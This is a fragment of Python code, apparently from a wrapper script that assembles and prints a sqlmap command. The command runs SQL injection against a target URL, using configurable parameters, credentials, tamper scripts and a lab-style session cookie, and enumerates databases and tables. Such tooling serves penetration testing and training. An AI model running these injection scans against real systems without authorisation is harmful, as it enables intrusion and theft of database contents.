...
# -------------------------------------------------------------------------------------
   ...
   if selection =='0':
      ...
      if DABASO	== 1 and TABLEO	== 1:
         command = "sqlmap -v " + VernOT.rstrip(" ") + " -u " + WebNam.rstrip(" ") + " -p " + Params.rstrip(" ") +  " --data='username=" + UsName.rstrip(" ") + "&password=" + PaWord.rstrip(" ") + "' --user-agent='" + UserAG.rstrip(" ") + "' --method=" + MethUD.rstrip(" ") + " --delay=" + TimeDE.rstrip(" ") + " --timeout=" + TimeOT.rstrip(" ") + " --retries=" + Retrie.rstrip(" ") + " --keep-alive --threads=" + Thread.rstrip(" ") + " --dbms=" + DataBA.rstrip(" ") + " --os=" + OperSY.rstrip(" ") + " --level=" + Levels.rstrip(" ") + " --risk=" + RiskLe.rstrip(" ") + " --tamper=" + TSeLec.rstrip(" ") + " --cookie='PHPSESSIONID=" + Cookie.rstrip(" ") + "; security=low' --banner --is-dba --technique=" + TechNQ.rstrip(" ") + " --dbs --tables --batch --flush-session --fresh-queries -s logs/scan_report.txt -t logs/scan_trace.txt > logs/scan_out.txt"
      if SHOWCD == 1:
         print("\n" + command + "\n") 
